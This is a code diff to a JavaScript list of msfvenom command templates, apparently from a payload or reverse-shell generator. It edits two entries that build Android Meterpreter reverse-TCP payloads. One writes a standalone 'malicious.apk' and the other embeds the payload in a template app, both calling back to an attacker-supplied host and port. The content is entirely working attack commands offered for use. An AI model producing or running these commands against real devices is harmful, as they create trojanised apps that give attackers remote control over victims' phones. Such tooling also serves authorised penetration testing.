@@ -327,12 +327,12 @@ const msfvenomCommands =  withCommandType(
         },
         {
             "name": "Android Meterpreter Reverse TCP",
-            "command": "msfvenom -a x64 --platform android -p android/meterpreter/reverse_tcp lhost={ip} lport={port} R -o malicious.apk",
+            "command": "msfvenom --platform android -p android/meterpreter/reverse_tcp lhost={ip} lport={port} R -o malicious.apk",
             "meta": ["msfvenom", "android", "android", "reverse"]
         },
         {
             "name": "Android Meterpreter Embed Reverse TCP",
-            "command": "msfvenom -a x64 --platform android -x template-app.apk -p android/meterpreter/reverse_tcp lhost={ip} lport={port} -o payload.apk",
+            "command": "msfvenom --platform android -x template-app.apk -p android/meterpreter/reverse_tcp lhost={ip} lport={port} -o payload.apk",
             "meta": ["msfvenom", "android", "android", "reverse"]
         },
         {
